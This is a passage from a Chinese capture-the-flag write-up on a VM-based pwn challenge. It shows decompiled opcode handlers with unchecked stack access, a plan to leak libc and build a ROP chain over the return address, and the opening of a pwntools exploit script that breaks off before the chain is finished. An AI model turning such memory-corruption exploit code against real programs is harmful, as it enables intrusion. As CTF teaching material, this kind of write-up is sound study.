</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)(</span><span class="n">vm_struct</span><span class="o">-&gt;</span><span class="n">reg</span><span class="p">[(</span><span class="n">v3</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1F</span><span class="p">]</span> <span class="o">+</span> <span class="nf">BYTE2</span><span class="p">(</span><span class="n">v3</span><span class="p">))</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">byte_4010</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)(</span><span class="n">vm_struct</span><span class="o">-&gt;</span><span class="n">reg</span><span class="p">[(</span><span class="n">v3</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1F</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="nf">HIWORD</span><span class="p">(</span><span class="n">v3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">))</span> <span class="o">+</span> <span class="n">stack</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">v4</span> <span class="o">=</span> <span class="n">vm_struct</span><span class="o">-&gt;</span><span class="n">reg</span><span class="p">[</span><span class="n">v3</span> <span class="o">&amp;</span> <span class="mh">0x1F</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>store：把某栈地址+medium寄存器内容+偏移处的8字节，给low寄存器</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">vm_struct</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">mov</span><span class="p">(</span><span class="n">vm_struct</span> <span class="o">*</span><span class="n">vm_struct</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">vm_struct</span> <span class="o">*</span><span class="n">vm_struct_1</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+1Eh] [rbp-22h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-20h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">vm_struct</span><span class="o">-&gt;</span><span class="n">opcode</span> <span class="o">+</span> <span class="p">(</span><span class="n">vm_struct</span><span class="o">-&gt;</span><span class="n">rip</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFFCLL</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="n">vm_struct</span><span class="o">-&gt;</span><span class="n">rip</span> <span class="o">+=</span> <span class="mi">4LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">vm_struct_1</span> <span class="o">=</span> <span class="p">(</span><span class="n">vm_struct</span> <span class="o">*</span><span class="p">)(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">byte_4010</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)(</span><span class="n">vm_struct</span><span class="o">-&gt;</span><span class="n">reg</span><span class="p">[(</span><span class="n">v4</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1F</span><span class="p">]</span> <span class="o">+</span> <span class="nf">BYTE2</span><span class="p">(</span><span class="n">v4</span><span class="p">))</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">byte_4010</span> <span class="p">)</span><span class="c1">// 0xff
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">vm_struct_1</span> <span class="o">=</span> <span class="n">vm_struct</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="n">vm_struct</span><span class="o">-&gt;</span><span class="n">reg</span><span class="p">[(</span><span class="n">v4</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1F</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="nf">HIWORD</span><span class="p">(</span><span class="n">v4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">vm_struct</span><span class="o">-&gt;</span><span class="n">reg</span><span class="p">[</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mh">0x1F</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">v3</span> <span class="o">+</span> <span class="n">a2</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">56</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                              <span class="o">|</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">v3</span> <span class="o">+</span> <span class="n">a2</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">48</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                              <span class="o">|</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">v3</span> <span class="o">+</span> <span class="n">a2</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">40</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                              <span class="o">|</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">v3</span> <span class="o">+</span> <span class="n">a2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                              <span class="o">|</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">v3</span> <span class="o">+</span> <span class="n">a2</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                              <span class="o">|</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">v3</span> <span class="o">+</span> <span class="n">a2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                              <span class="o">|</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="p">)(</span><span class="n">v3</span> <span class="o">+</span> <span class="n">a2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">vm_struct_1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="思路-1" class="headerLink">
    <a href="#%e6%80%9d%e8%b7%af-1" class="header-mark"></a>思路</h3><ul>
<li>把栈上的libc地址存在vm_struct的寄存器中</li>
<li>因为我们的opcode是存在栈上的，所以在opcode的末尾可以加上我们自己的东西</li>
<li>把寄存器的libc地址，加减我们写入opcode末尾的偏移，构造rop链</li>
<li>把rop链写入栈中返回地址处</li>
</ul>
<h3 id="exp-2" class="headerLink">
    <a href="#exp-2" class="header-mark"></a>exp</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="o">=</span> <span class="s1">&#39;./pwn1&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># address = &#39;./pwn_patched&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#-----------------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ss</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># lg      = lambda s,addr		        : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s,addr))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>			        <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xf7</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">r64</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">ir64</span>    <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#-----------------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> \
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    # bbase 0x1b70
</span></span></span><span class="line"><span class="cl"><span class="s2">    # bbase 0x1AFB #Unsupported instruction的leave;ret
</span></span></span><span class="line"><span class="cl"><span class="s2">    bbase 0x1aad
</span></span></span><span class="line"><span class="cl"><span class="s2">    c
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;host.docker.internal&#34;</span><span class="p">,</span><span class="mi">9999</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">gdbscript</span> <span class="o">=</span> <span class="n">gdbscript</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># gdb.attach(p)</span>
</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># pause()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">op</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span><span class="n">high</span><span class="p">,</span><span class="n">medium</span><span class="p">,</span><span class="n">low</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ope</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">opcode</span><span class="o">&lt;&lt;</span><span class="mi">28</span> <span class="o">|</span> <span class="p">(</span><span class="n">high</span><span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">16</span> <span class="o">|</span> <span class="p">(</span><span class="n">medium</span><span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">5</span> <span class="o">|</span> <span class="p">(</span><span class="n">low</span><span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ope</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">high</span><span class="p">,</span><span class="n">medium</span><span class="p">,</span><span class="n">low</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">op</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">high</span><span class="p">,</span><span class="n">medium</span><span class="p">,</span><span class="n">low</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sub</span><span class="p">(</span><span class="n">high</span><span class="p">,</span><span class="n">medium</span><span class="p">,</span><span class="n">low</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">op</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">high</span><span class="p">,</span><span class="n">medium</span><span class="p">,</span><span class="n">low</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">load</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span><span class="n">medium</span><span class="p">,</span><span class="n">src</span><span class="p">,</span><span class="n">opcode</span><span class="o">=</span><span class="mi">9</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ope</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">opcode</span><span class="o">&lt;&lt;</span><span class="mi">28</span> <span class="o">|</span> <span class="p">(</span><span class="n">offset</span><span class="o">&amp;</span><span class="mh">0xfff</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">16</span> <span class="o">|</span> <span class="p">(</span><span class="n">medium</span><span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">5</span> <span class="o">|</span> <span class="p">(</span><span class="n">src</span><span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ope</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">store</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span><span class="n">medium</span><span class="p">,</span><span class="n">dest</span><span class="p">,</span><span class="n">opcode</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ope</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">opcode</span><span class="o">&lt;&lt;</span><span class="mi">28</span> <span class="o">|</span> <span class="p">(</span><span class="n">offset</span><span class="o">&amp;</span><span class="mh">0xfff</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">16</span> <span class="o">|</span> <span class="p">(</span><span class="n">medium</span><span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">5</span> <span class="o">|</span> <span class="p">(</span><span class="n">dest</span><span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ope</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">base_addr</span> <span class="o">=</span> <span class="mh">0x120</span><span class="o">+</span><span class="mh">0x38</span>
</span></span><span class="line"><span class="cl"><span class="n">dest_offset</span> <span class="o">=</span> <span class="mh">0x118</span>
</span></span><span class="line"><span class="cl"><span class="c1">#dest:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 04:0020│ rdx rsi 0x7ffe2b9fa530 —▸ 0x7955af50f78b (__spawnix+875) ◂— pop rdi</span>
</span></span><span class="line"><span class="cl"><span class="c1">#ret_addr:</span>
